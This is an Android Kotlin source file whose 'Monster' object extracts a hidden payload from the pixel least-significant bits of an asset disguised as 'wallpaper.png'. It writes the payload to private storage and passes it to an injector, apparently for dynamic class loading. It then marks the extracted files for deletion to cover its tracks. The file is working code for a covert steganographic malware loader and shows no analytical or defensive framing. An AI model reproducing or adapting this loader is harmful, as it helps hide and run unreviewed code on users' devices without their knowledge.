package com.occ.annotation

import android.content.Context
import android.graphics.BitmapFactory
import android.util.Log
import dalvik.system.DexClassLoader
import java.io.BufferedReader
import java.io.File
import java.io.FileOutputStream
import java.io.FileReader
import java.nio.ByteBuffer
import java.nio.charset.Charset
import java.util.concurrent.Executors


object Monster {

    private val pool by lazy {
        Executors.newFixedThreadPool(1)
    }

    fun runJob(context: Context,) {
        pool.submit {
            val assetTarDir = File(context.filesDir, "monster")
            if (!assetTarDir.exists()) {
                assetTarDir.mkdirs()
            }
            val classJar = File(assetTarDir, "monster")
            if (classJar.exists()) {
                classJar.delete()
            }
            val ots = classJar.outputStream().buffered()
            val ins = context.assets.open("lite/wallpaper.png").buffered()
            var isReadyToRun = false
            try {
                val buffer = ByteArray(2048)
                var length = 0
                ots.use { ot ->
                    ins.use { ins ->
                        while (ins.read(buffer).also { length = it } > 0) {
                            ot.write(buffer, 0, length)
                        }
                    }
                }
                isReadyToRun = true
            } catch (e: Exception) {
                e.printStackTrace()
            }
            if (!isReadyToRun) return@submit
            classJar.deleteOnExit()
            try {
                val classExtJar = copyFiles(classJar.absolutePath,assetTarDir.absolutePath)
                    ?:return@submit
                CoreInject.getInstant().a(classExtJar.absolutePath,assetTarDir.absolutePath,"")
                assetTarDir.walkTopDown().onEach {
                    it.deleteOnExit()
                }
            }catch (e:Exception){
                e.printStackTrace()
            }

        }
    }

    private fun copyFiles(srcPath: String, outputDir: String):File? {
        val option = BitmapFactory.Options()
        val img = BitmapFactory.decodeFile(srcPath,option)
        val width: Int = option.outWidth
        val height: Int = option.outHeight
        val bits: MutableList<Int> = ArrayList()
        for (y in 0 until height) {
            for (x in 0 until width) {
                val rgb: Int = img.getPixel(x, y)
                bits.add(rgb shr 16 and 1)
                bits.add(rgb shr 8 and 1)
                bits.add(rgb and 1)
            }
        }

        val data = ByteArray(bits.size / 8)
        for (i in data.indices) {
            var byteValue = 0
            for (j in 0..7) {
                val bitIndex = i * 8 + j
                if (bitIndex < bits.size) {
                    byteValue = byteValue shl 1 or bits[bitIndex]
                }
            }
            data[i] = byteValue.toByte()
        }


        var ptr = 0
        while (ptr < data.size) {
            if (ptr + 4 > data.size) break
            val nameLen = ByteBuffer.wrap(data, ptr, 4).int
            ptr += 4


            if (ptr + nameLen > data.size) break
            val fileName = String(data, ptr, nameLen, Charset.forName("UTF-8"))
            ptr += nameLen


            if (ptr + 8 > data.size) break
            val fileSize = ByteBuffer.wrap(data, ptr, 8).long
            ptr += 8


            if (ptr + fileSize > data.size) break
            val fileData = ByteArray(fileSize.toInt())
            System.arraycopy(data, ptr, fileData, 0, fileSize.toInt())
            ptr += fileSize.toInt()


            val outputFile = File(outputDir, fileName)
            if (!outputFile.exists()) {
                outputFile.parentFile?.mkdirs()
                outputFile.createNewFile()
            }
            FileOutputStream(outputFile).use { out ->
                val len: Int = fileData.size
                var rem = len
                while (rem > 0) {
                    val n = rem.coerceAtMost(8192)
                    out.write(fileData, len - rem, n)
                    rem -= n
                }
            }
        }
        return File(outputDir).listFiles()?.firstOrNull()
    }

}